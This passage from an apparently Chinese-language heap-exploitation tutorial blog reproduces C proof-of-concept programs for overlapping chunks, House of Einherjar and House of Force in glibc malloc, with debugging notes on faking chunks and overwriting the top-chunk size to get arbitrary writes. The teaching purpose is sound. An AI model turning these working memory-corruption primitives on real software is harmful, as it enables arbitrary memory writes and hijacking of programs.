by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="type">unsigned</span> <span class="type">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="type">unsigned</span> <span class="type">char</span> *) p3+real_size_p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-9"><a href="#调试-9" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AY7EM3HWZB8HJSE.png"
                      alt="图片描述"
                ><br>首先申请5个<code>0x3e8</code>堆块，<code>p1</code>,<code>p2</code>,<code>p3</code>,<code>p4</code>,<code>p5</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K6GZGM7MWCZGCTS.png"
                      alt="图片描述"
                ><br><code>free(4)</code>后，假设<code>p1</code>存在<code>off-by-one</code>漏洞，将<code>p2</code>的<code>size</code>改为<code>0x3f0+0x3f0+0x1=0x7e1</code>大小。再次<code>free(p2)</code>将会把<code>p3</code>覆盖掉，并且会与<code>chunk_p4</code>重合，此时我们再次申请0x7d8大小的堆块即可获得chunk_p3的控制权。</p>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">	fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">	fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">	fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">	fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">	fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">	fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">	<span class="type">int</span> real_b_size = <span class="built_in">malloc_usable_size</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">	<span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">		   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">		   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">		   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">	<span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">	*(<span class="type">size_t</span>*)&amp;a[real_a_size-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">	fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line">	<span class="comment">//do two things: </span></span><br><span class="line">	<span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line">	<span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line">	<span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line">	<span class="comment">//at the location we control. </span></span><br><span class="line">	<span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line">	<span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">	<span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line">	<span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-10"><a href="#调试-10" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F3ZFDGEK2RFX33H.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F4BT7673NJYMD9K.png"
                      alt="图片描述"
                ><br>申请<code>a=0x41</code>，<code>b=0x101</code>两个堆块，并在栈上构建一个<code>fake_chunk</code>，并且<code>fake_chunk_fd_bk = fake_chunk_prev_size</code>，用来绕过<code>unlink</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_8ZKFC6YP36TCPUC.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_69JHW2FXP62QRD8.png"
                      alt="图片描述"
                ><br>然后利用<code>off-by-null</code>漏洞将堆块<code>b</code>的<code>PREV_INUSE</code>位改为<code>0</code>，计算出堆块<code>b</code>与<code>fake_chunk</code>的距离(<code>fake_size</code>)，这里是个负数。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_G7UVK2Z39Q7V4N2.png"
                      alt="图片描述"
                ><br>然后将<code>fake_chunk_size</code>改为<code>fake_size</code>，然后将堆块<code>b</code>的<code>prev_size</code>改为改为<code>fake_size</code>，绕过检查<code>prev_size == size</code>的检查。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2UT6ZP9UTJP74U9.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4DKB7Y89T8FSWD8.png"
                      alt="图片描述"
                ><br>我们<code>free(b)</code>后，会进行如上检查。向后合并会把负数<code>fake_size</code>转为整数，然后会先开始后合并，又<code>chunk_b</code>紧邻<code>top_chunk</code>，会再与其进行合并。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7ZCUWQ3KAVGKAB7.png"
                      alt="图片描述"
                ><br>此时我们再申请堆块将从<code>fake_chunk_prev_size</code>开始分配。</p>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line">		<span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> real_size = <span class="built_in">malloc_usable_size</span>(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="built_in">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	<span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">	 * new_top = old_top + nb</span></span><br><span class="line"><span class="comment">	 * nb = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line">	<span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// some further discussion:</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line">	<span class="comment">//	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line">	<span class="comment">//	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-11"><a href="#调试-11" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D3DCDBFN6BFS7AY.png"
                      alt="图片描述"
                ><br>首先申请了一个<code>a_real=0x111</code>大小的堆块，利用<code>off-by-one</code>将<code>top_chunk</code>的<code>size</code>改为<code>-1</code>，此时我们便可以申请到任意地址，<code>top_chunk地址 = 原top_chunk地址 + 对齐后的申请大小</code>。只要我们计算好距离，便可申请到任意地址，下到<code>got</code>,<code>bss</code>，上到<code>__malloc_hook</code>，相当于任意地址写的能力。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KN4WJWSJJ4HC9VE.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FRYZ59TQMSFW6TK.png"
                      alt="图片描述"
                ><br>计算出<code>bss_var-0x20</code>到<code>top_chunk</code>的距离<code>0x602060-0x603110=-5A2 E0B0</code>，注意此时我们申请结束后，<code>top_chunk=0x6030110+(-5A2EB0)+0x10=0x602070</code>，成功将top_chunk迁移到了目标地址下方。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QRUXTS646FKXEAS.png"
                      alt="图片描述"
